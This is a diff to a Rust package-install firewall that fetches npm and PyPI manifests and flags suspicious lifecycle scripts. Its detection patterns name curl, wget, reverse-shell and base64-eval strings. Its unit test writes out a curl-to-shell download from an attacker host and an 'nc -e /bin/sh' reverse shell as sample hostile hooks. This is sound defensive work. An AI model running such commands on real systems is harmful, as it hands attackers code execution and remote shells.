@@ -94,6 +94,12 @@ impl FirewallWrapper {
                     }
                 }
 
+                // 1b. Remote Registry Lifecycle Hook & Supply Chain Pre-Flight Evaluation (SC-001, SC-002, SC-013)
+                let remote_findings = Self::evaluate_remote_package_manifest(pkg).await;
+                for rf in remote_findings {
+                    blocked_reasons.push(rf);
+                }
+
                 // Static rules already blocked this install; skip the network round-trip.
                 if !blocked_reasons.is_empty() {
                     continue;
@@ -269,6 +275,144 @@ impl FirewallWrapper {
                     })
             }
         }
+    }
+
+    /// Evaluates scripts map extracted from package manifest for dangerous lifecycle hooks
+    pub fn inspect_package_scripts(
+        pkg_name: &str,
+        scripts_val: Option<&serde_json::Map<String, serde_json::Value>>,
+    ) -> Vec<String> {
+        let mut reasons = Vec::new();
+        if let Some(scripts) = scripts_val {
+            for (hook, cmd_val) in scripts {
+                if hook == "preinstall" || hook == "install" || hook == "postinstall" {
+                    let cmd = cmd_val.as_str().unwrap_or("");
+                    // Check network egress in install scripts (SC-002)
+                    if cmd.contains("curl ")
+                        || cmd.contains("wget ")
+                        || cmd.contains("Invoke-WebRequest")
+                        || cmd.contains("fetch(")
+                        || cmd.contains("http.get")
+                        || cmd.contains("net.connect")
+                        || cmd.contains("powershell")
+                    {
+                        reasons.push(format!(
+                            "[MALICIOUS LIFECYCLE HOOK] Package '{}' defines suspicious network egress in '{}' script: {}",
+                            pkg_name, hook, cmd
+                        ));
+                    }
+                    // Check reverse shell / execution (SC-013)
+                    if cmd.contains("/bin/sh -i")
+                        || cmd.contains("/bin/bash -i")
+                        || cmd.contains("bash -i >&")
+                        || cmd.contains("sh -i >&")
+                        || cmd.contains("nc -e")
+                        || cmd.contains("nc.exe")
+                    {
+                        reasons.push(format!(
+                            "[REVERSE SHELL DETECTED] Package '{}' defines reverse shell in '{}' script: {}",
+                            pkg_name, hook, cmd
+                        ));
+                    }
+                    // Check dynamic eval / obfuscation (SC-003, SC-005)
+                    if cmd.contains("eval(")
+                        || (cmd.contains("Buffer.from") && cmd.contains("base64"))
+                        || cmd.contains("base64.b64decode")
+                    {
+                        reasons.push(format!(
+                            "[OBFUSCATED CODE DETECTED] Package '{}' defines obfuscated dynamic execution in '{}' script: {}",
+                            pkg_name, hook, cmd
+                        ));
+                    }
+                }
+            }
+        }
+        reasons
+    }
+
+    /// Check remote registry manifest (npm or PyPI) for dangerous lifecycle scripts (preinstall/postinstall)
+    /// before installation begins.
+    pub async fn evaluate_remote_package_manifest(pkg: &PackageToEvaluate) -> Vec<String> {
+        let mut reasons = Vec::new();
+        if std::env::var("VEXA_FIREWALL_OFFLINE")
+            .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
+            .unwrap_or(false)
+        {
+            return reasons;
+        }
+
+        let client = match reqwest::Client::builder()
+            .timeout(Duration::from_millis(1500))
+            .build()
+        {
+            Ok(c) => c,
+            Err(_) => return reasons,
+        };
+
+        if pkg.ecosystem.eq_ignore_ascii_case("npm") {
+            let url = if let Some(ver) = &pkg.version {
+                if ver != "*" && ver != "latest" && !ver.starts_with('^') && !ver.starts_with('~') {
+                    format!("https://registry.npmjs.org/{}/{}", pkg.name, ver)
+                } else {
+                    format!("https://registry.npmjs.org/{}", pkg.name)
+                }
+            } else {
+                format!("https://registry.npmjs.org/{}", pkg.name)
+            };
+
+            if let Ok(resp) = client.get(&url).send().await {
+                if resp.status().is_success() {
+                    if let Ok(json) = resp.json::<serde_json::Value>().await {
+                        let scripts_opt =
+                            json.get("scripts").and_then(|s| s.as_object()).or_else(|| {
+                                let latest_tag = json
+                                    .get("dist-tags")
+                                    .and_then(|dt| dt.get("latest"))
+                                    .and_then(|l| l.as_str())
+                                    .unwrap_or("");
+                                if !latest_tag.is_empty() {
+                                    json.get("versions")
+                                        .and_then(|v| v.get(latest_tag))
+                                        .and_then(|vobj| vobj.get("scripts"))
+                                        .and_then(|s| s.as_object())
+                                } else {
+                                    None
+                                }
+                            });
+
+                        let script_findings = Self::inspect_package_scripts(&pkg.name, scripts_opt);
+                        reasons.extend(script_findings);
+                    }
+                }
+            }
+        } else if pkg.ecosystem.eq_ignore_ascii_case("pypi") {
+            let url = format!("https://pypi.org/pypi/{}/json", pkg.name);
+            if let Ok(resp) = client.get(&url).send().await {
+                if resp.status().is_success() {
+                    if let Ok(json) = resp.json::<serde_json::Value>().await {
+                        if let Some(info) = json.get("info").and_then(|i| i.as_object()) {
+                            let summary =
+                                info.get("summary").and_then(|s| s.as_str()).unwrap_or("");
+                            let desc = info
+                                .get("description")
+                                .and_then(|s| s.as_str())
+                                .unwrap_or("");
+                            if desc.contains("bash -i >& /dev/tcp")
+                                || summary.contains("bash -i >& /dev/tcp")
+                                || desc.contains("nc -e /bin/sh")
+                            {
+                                reasons.push(format!(
+                                    "[REVERSE SHELL DETECTED] PyPI Package '{}' contains reverse shell string in package metadata",
+                                    pkg.name
+                                ));
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        reasons
     }
 
     pub fn extract_packages_to_install(pm: &str, args: &[String]) -> Vec<PackageToEvaluate> {
@@ -461,5 +605,26 @@ mod tests {
         assert_eq!(pkgs.len(), 1);
         assert_eq!(pkgs[0].name, "tokio");
         assert_eq!(pkgs[0].version.as_deref(), Some("1.35.0"));
+    }
+
+    #[test]
+    fn test_inspect_package_scripts_network_and_reverse_shell() {
+        let mut scripts = serde_json::Map::new();
+        scripts.insert(
+            "postinstall".to_string(),
+            serde_json::Value::String("curl https://evil.attacker.com/payload.sh | sh".to_string()),
+        );
+        let reasons = FirewallWrapper::inspect_package_scripts("malicious-lib", Some(&scripts));
+        assert!(!reasons.is_empty());
+        assert!(reasons[0].contains("MALICIOUS LIFECYCLE HOOK"));
+
+        let mut bidi_shell = serde_json::Map::new();
+        bidi_shell.insert(
+            "preinstall".to_string(),
+            serde_json::Value::String("nc -e /bin/sh 10.0.0.1 4444".to_string()),
+        );
+        let shell_reasons = FirewallWrapper::inspect_package_scripts("bad-dep", Some(&bidi_shell));
+        assert!(!shell_reasons.is_empty());
+        assert!(shell_reasons[0].contains("REVERSE SHELL DETECTED"));
     }
 }
